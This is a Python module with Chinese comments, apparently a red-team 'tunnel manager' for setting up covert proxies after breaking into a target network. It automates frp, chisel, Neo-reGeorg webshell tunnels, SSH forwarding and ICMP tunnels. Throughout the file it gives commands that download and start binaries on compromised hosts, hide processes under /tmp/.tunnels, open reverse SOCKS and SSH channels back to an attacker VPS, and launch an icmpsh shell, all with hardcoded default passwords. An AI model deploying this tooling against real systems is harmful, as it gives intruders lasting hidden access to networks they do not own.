#!/usr/bin/env python3
"""
Tunnel Manager — 红队隧道代理管理模块

整合 frp/chisel/Neo-reGeorg/ssh 隧道的自动化部署与管理。
打进内网后一键搭建隧道，让队友通过代理进入目标网络。

支持隧道类型：
1. frp — 反向代理（TCP/UDP/HTTP/SOCKS5）
2. chisel — HTTP 隧道（穿防火墙）
3. Neo-reGeorg — Web 隧道（仅需 webshell）
4. SSH — 原生 SSH 隧道（动态转发/端口转发）
5. ICMP — ICMP 隧道（极端环境）

用法：
    from tunnel_manager import TunnelManager
    tm = TunnelManager(kb)  # kb = KaliBridge 实例

    # 一键部署 frp 反向代理
    tm.frp_deploy(target_ip="10.0.0.5", vps_ip="1.2.3.4", vps_port=7000)

    # chisel HTTP 隧道
    tm.chisel_server(vps_ip="1.2.3.4", port=8080)
    tm.chisel_client(target_ip="10.0.0.5", server="1.2.3.4:8080")

    # Neo-reGeorg web 隧道（只需 webshell 上传能力）
    tm.neoregeorg_generate(password="redteam2026")
    tm.neoregeorg_connect(shell_url="http://target.com/shell.jsp", password="redteam2026")

    # SSH 动态转发
    tm.ssh_dynamic(target_ip="10.0.0.5", user="root", port=22, local_port=1080)
"""

import os
import time
import json
from dataclasses import dataclass, field
from typing import List, Dict, Optional


@dataclass
class TunnelSession:
    """隧道会话"""
    tunnel_type: str = ""       # frp/chisel/neoregeorg/ssh/icmp
    target_ip: str = ""
    vps_ip: str = ""
    local_port: int = 0
    remote_port: int = 0
    status: str = "inactive"    # active/inactive/error
    pid: int = 0
    start_time: str = ""
    config: Dict = field(default_factory=dict)


class TunnelManager:
    """红队隧道管理器"""

    def __init__(self, kb=None):
        """
        Args:
            kb: KaliBridge 实例（SSH 远程执行）
        """
        self.kb = kb
        self.sessions: List[TunnelSession] = []
        self.tunnel_dir = "/tmp/.tunnels"

    def _run(self, cmd, timeout=30):
        """执行命令（通过 KaliBridge 或本地）"""
        if self.kb and self.kb.is_available():
            return self.kb.run(cmd, timeout=timeout)
        else:
            import subprocess
            try:
                r = subprocess.run(cmd, shell=True, capture_output=True, text=True, timeout=timeout)
                return {"success": r.returncode == 0, "output": (r.stdout + r.stderr)[:5000]}
            except Exception as e:
                return {"success": False, "output": str(e)}

    # ═══════════════════════════════════════════════════════════
    # FRP — 反向代理隧道
    # ═══════════════════════════════════════════════════════════

    def frp_gen_server_config(self, bind_port=7000, dashboard_port=7500,
                              token="redteam2026") -> str:
        """生成 frps.ini 服务端配置"""
        config = f"""[common]
bind_port = {bind_port}
dashboard_port = {dashboard_port}
dashboard_user = admin
dashboard_pwd = {token}
token = {token}
"""
        return config

    def frp_gen_client_config(self, vps_ip: str, vps_port=7000, token="redteam2026",
                              socks_port=1080, remote_port=6000) -> str:
        """生成 frpc.ini 客户端配置（目标机上跑）"""
        config = f"""[common]
server_addr = {vps_ip}
server_port = {vps_port}
token = {token}

[socks5]
type = tcp
remote_port = {socks_port}
plugin = socks5

[ssh_reverse]
type = tcp
local_ip = 127.0.0.1
local_port = 22
remote_port = {remote_port}
"""
        return config

    def frp_deploy_server(self, vps_ip: str, bind_port=7000, token="redteam2026"):
        """在 VPS 上部署 frp 服务端"""
        config = self.frp_gen_server_config(bind_port, token=token)
        cmds = [
            f"mkdir -p {self.tunnel_dir}",
            f"echo '{config}' > {self.tunnel_dir}/frps.ini",
            f"which frps || (wget -q https://github.com/fatedier/frp/releases/download/v0.61.0/frp_0.61.0_linux_amd64.tar.gz -O /tmp/frp.tar.gz && tar -xzf /tmp/frp.tar.gz -C /tmp/ && cp /tmp/frp_*/frps /usr/local/bin/)",
            f"nohup frps -c {self.tunnel_dir}/frps.ini > /dev/null 2>&1 &",
        ]
        results = []
        for cmd in cmds:
            r = self._run(cmd)
            results.append(r)

        session = TunnelSession(
            tunnel_type="frp_server", vps_ip=vps_ip,
            remote_port=bind_port, status="active",
            start_time=time.strftime("%Y-%m-%d %H:%M:%S"),
            config={"bind_port": bind_port, "token": token}
        )
        self.sessions.append(session)
        return {"success": True, "session": session, "results": results}

    def frp_deploy_client(self, target_ip: str, vps_ip: str, vps_port=7000,
                          token="redteam2026", socks_port=1080):
        """在目标机上部署 frp 客户端（需要已有 shell）"""
        config = self.frp_gen_client_config(vps_ip, vps_port, token, socks_port)
        # 通过已有 shell 写入配置并执行
        deploy_cmd = f"""
mkdir -p {self.tunnel_dir} && \
echo '{config}' > {self.tunnel_dir}/frpc.ini && \
(which frpc || (curl -sL https://github.com/fatedier/frp/releases/download/v0.61.0/frp_0.61.0_linux_amd64.tar.gz | tar -xz -C /tmp/ && cp /tmp/frp_*/frpc /usr/local/bin/)) && \
nohup frpc -c {self.tunnel_dir}/frpc.ini > /dev/null 2>&1 &
"""
        r = self._run(deploy_cmd, timeout=60)
        session = TunnelSession(
            tunnel_type="frp_client", target_ip=target_ip, vps_ip=vps_ip,
            local_port=socks_port, remote_port=vps_port, status="active",
            start_time=time.strftime("%Y-%m-%d %H:%M:%S"),
        )
        self.sessions.append(session)
        return {"success": r.get("success", False), "session": session, "output": r.get("output", "")}

    # ═══════════════════════════════════════════════════════════
    # Chisel — HTTP 隧道
    # ═══════════════════════════════════════════════════════════

    def chisel_server(self, port=8080, auth="admin:redteam2026"):
        """在 VPS 上启动 chisel server"""
        cmd = f"nohup chisel server --port {port} --auth '{auth}' --reverse > /dev/null 2>&1 &"
        r = self._run(cmd)
        session = TunnelSession(
            tunnel_type="chisel_server", remote_port=port, status="active",
            start_time=time.strftime("%Y-%m-%d %H:%M:%S"),
        )
        self.sessions.append(session)
        return {"success": r.get("success", False), "session": session}

    def chisel_client(self, server: str, socks_port=1080, auth="admin:redteam2026"):
        """在目标机上启动 chisel client（反向 SOCKS5）"""
        cmd = f"nohup chisel client --auth '{auth}' {server} R:socks > /dev/null 2>&1 &"
        r = self._run(cmd)
        session = TunnelSession(
            tunnel_type="chisel_client", vps_ip=server.split(":")[0],
            local_port=socks_port, status="active",
            start_time=time.strftime("%Y-%m-%d %H:%M:%S"),
        )
        self.sessions.append(session)
        return {"success": r.get("success", False), "session": session}

    # ═══════════════════════════════════════════════════════════
    # Neo-reGeorg — Web 隧道（仅需 webshell）
    # ═══════════════════════════════════════════════════════════

    def neoregeorg_generate(self, password="redteam2026", output_dir="/tmp/neoregeorg"):
        """生成 Neo-reGeorg 隧道脚本（jsp/aspx/php）"""
        cmd = f"""
mkdir -p {output_dir} && \
(which neoreg || pip3 install neoreg -q) && \
neoreg generate -k {password} -o {output_dir}
"""
        r = self._run(cmd, timeout=30)
        return {
            "success": r.get("success", False),
            "output": r.get("output", ""),
            "files": {
                "jsp": f"{output_dir}/tunnel.jsp",
                "aspx": f"{output_dir}/tunnel.aspx",
                "php": f"{output_dir}/tunnel.php",
            },
            "next_step": "将对应文件上传到目标 web 目录，然后用 neoregeorg_connect 连接"
        }

    def neoregeorg_connect(self, shell_url: str, password="redteam2026", local_port=1080):
        """连接 Neo-reGeorg web 隧道"""
        cmd = f"nohup neoreg -k {password} -u {shell_url} -l 0.0.0.0 -p {local_port} > /dev/null 2>&1 &"
        r = self._run(cmd)
        session = TunnelSession(
            tunnel_type="neoregeorg", target_ip=shell_url,
            local_port=local_port, status="active",
            start_time=time.strftime("%Y-%m-%d %H:%M:%S"),
            config={"shell_url": shell_url, "password": password}
        )
        self.sessions.append(session)
        return {"success": r.get("success", False), "session": session}

    # ═══════════════════════════════════════════════════════════
    # SSH 隧道
    # ═══════════════════════════════════════════════════════════

    def ssh_dynamic(self, target_ip: str, user="root", port=22, local_port=1080, key=""):
        """SSH 动态端口转发（SOCKS5 代理）"""
        key_opt = f"-i {key}" if key else ""
        cmd = f"ssh -fND {local_port} {key_opt} -o StrictHostKeyChecking=no {user}@{target_ip} -p {port}"
        r = self._run(cmd, timeout=15)
        session = TunnelSession(
            tunnel_type="ssh_dynamic", target_ip=target_ip,
            local_port=local_port, status="active",
            start_time=time.strftime("%Y-%m-%d %H:%M:%S"),
        )
        self.sessions.append(session)
        return {"success": r.get("success", False), "session": session,
                "proxy": f"socks5://127.0.0.1:{local_port}"}

    def ssh_forward(self, target_ip: str, user="root", local_port=8888,
                    remote_host="127.0.0.1", remote_port=3306, key=""):
        """SSH 本地端口转发（访问目标内网服务）"""
        key_opt = f"-i {key}" if key else ""
        cmd = (f"ssh -fNL {local_port}:{remote_host}:{remote_port} "
               f"{key_opt} -o StrictHostKeyChecking=no {user}@{target_ip}")
        r = self._run(cmd, timeout=15)
        session = TunnelSession(
            tunnel_type="ssh_forward", target_ip=target_ip,
            local_port=local_port, remote_port=remote_port, status="active",
            start_time=time.strftime("%Y-%m-%d %H:%M:%S"),
        )
        self.sessions.append(session)
        return {"success": r.get("success", False), "session": session,
                "access": f"127.0.0.1:{local_port} → {remote_host}:{remote_port}"}

    def ssh_reverse(self, target_ip: str, user="root", vps_port=9999,
                    local_host="127.0.0.1", local_port=22, key=""):
        """SSH 反向隧道（目标连回 VPS）"""
        key_opt = f"-i {key}" if key else ""
        cmd = (f"ssh -fNR {vps_port}:{local_host}:{local_port} "
               f"{key_opt} -o StrictHostKeyChecking=no {user}@{target_ip}")
        r = self._run(cmd, timeout=15)
        return {"success": r.get("success", False), "output": r.get("output", "")}

    # ═══════════════════════════════════════════════════════════
    # ICMP 隧道（极端环境）
    # ═══════════════════════════════════════════════════════════

    def icmp_tunnel(self, target_ip: str, vps_ip: str, tool="pingtunnel"):
        """ICMP 隧道（当 TCP/UDP 全封时使用）"""
        if tool == "pingtunnel":
            server_cmd = f"nohup pingtunnel -type server > /dev/null 2>&1 &"
            client_cmd = f"nohup pingtunnel -type client -l :1080 -s {vps_ip} -sock5 1 > /dev/null 2>&1 &"
        else:
            server_cmd = f"nohup icmpsh -l {vps_ip} > /dev/null 2>&1 &"
            client_cmd = f"nohup icmpsh -c {vps_ip} > /dev/null 2>&1 &"

        return {
            "server_cmd": server_cmd,
            "client_cmd": client_cmd,
            "note": "ICMP 隧道需要 root 权限，且速度较慢"
        }

    # ═══════════════════════════════════════════════════════════
    # 会话管理
    # ═══════════════════════════════════════════════════════════

    def list_tunnels(self) -> List[Dict]:
        """列出所有活跃隧道"""
        return [
            {
                "type": s.tunnel_type,
                "target": s.target_ip,
                "vps": s.vps_ip,
                "local_port": s.local_port,
                "remote_port": s.remote_port,
                "status": s.status,
                "start_time": s.start_time,
            }
            for s in self.sessions
        ]

    def kill_all(self):
        """关闭所有隧道"""
        kill_cmds = [
            "pkill -f frpc",
            "pkill -f frps",
            "pkill -f chisel",
            "pkill -f neoreg",
            "pkill -f pingtunnel",
        ]
        for cmd in kill_cmds:
            self._run(cmd, timeout=5)
        for s in self.sessions:
            s.status = "inactive"
        return {"success": True, "message": "所有隧道已关闭"}

    def check_connectivity(self, proxy_port=1080) -> Dict:
        """检查隧道连通性"""
        cmd = f"curl -s --socks5 127.0.0.1:{proxy_port} http://httpbin.org/ip --max-time 10"
        r = self._run(cmd, timeout=15)
        return {
            "connected": r.get("success", False) and "origin" in r.get("output", ""),
            "output": r.get("output", ""),
        }
